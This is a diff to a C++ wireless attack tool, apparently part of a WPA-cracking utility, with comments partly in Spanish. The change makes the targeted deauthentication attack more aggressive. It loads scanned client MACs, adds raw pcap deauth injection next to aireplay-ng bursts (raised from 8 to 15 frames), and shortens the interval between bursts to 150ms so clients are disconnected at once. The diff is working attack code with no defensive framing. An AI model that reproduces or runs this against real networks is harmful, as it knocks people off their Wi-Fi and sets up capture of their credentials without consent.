@@ -487,29 +487,40 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
         ssid_local.c_str(), bssid.c_str());
     sleep(2);
 
+    // Cargar clientes descubiertos durante la fase de escaneo previa
+    {
+        std::lock_guard<std::mutex> lock(targets_mtx);
+        auto it = targets.find(bssid);
+        if (it != targets.end()) {
+            known_clients = it->second.clients;
+        }
+    }
+
     // BSSID in uppercase for CSV matching
     std::string bssid_upper = bssid;
     for (auto &c : bssid_upper) c = (char)toupper((unsigned char)c);
 
-    // ── 2. Continuous deauth thread ───────────────────────────────────────────
-    std::vector<std::string> known_clients;
-    std::set<std::string> announced;
+    // ── 2. Ultra-Fast Continuous Deauth Thread (Dual Injection) ───────────────
     std::atomic<bool> deauth_active(true);
 
     std::thread deauth_t([&]() {
         while (deauth_active && keep_running) {
+            // Ataque 1: Inyección directa por raw pcap (súper rápido)
+            send_deauth(bssid);
+
+            // Ataque 2: Aireplay bursts dirigidos a clientes o broadcast
             std::vector<std::string> snap = known_clients;
             if (!snap.empty()) {
                 for (const auto &cli : snap) {
                     if (!deauth_active) break;
-                    std::system(("aireplay-ng --deauth 8 -a " + bssid +
+                    std::system(("aireplay-ng --deauth 15 -a " + bssid +
                         " -c " + cli + " " + current_iface + " > /dev/null 2>&1").c_str());
                 }
             } else {
-                std::system(("aireplay-ng --deauth 8 -a " + bssid +
+                std::system(("aireplay-ng --deauth 15 -a " + bssid +
                     " " + current_iface + " > /dev/null 2>&1").c_str());
             }
-            usleep(500000); // 0.5s between bursts
+            usleep(150000); // 150ms entre ráfagas para desconexión instantánea
         }
     });
 
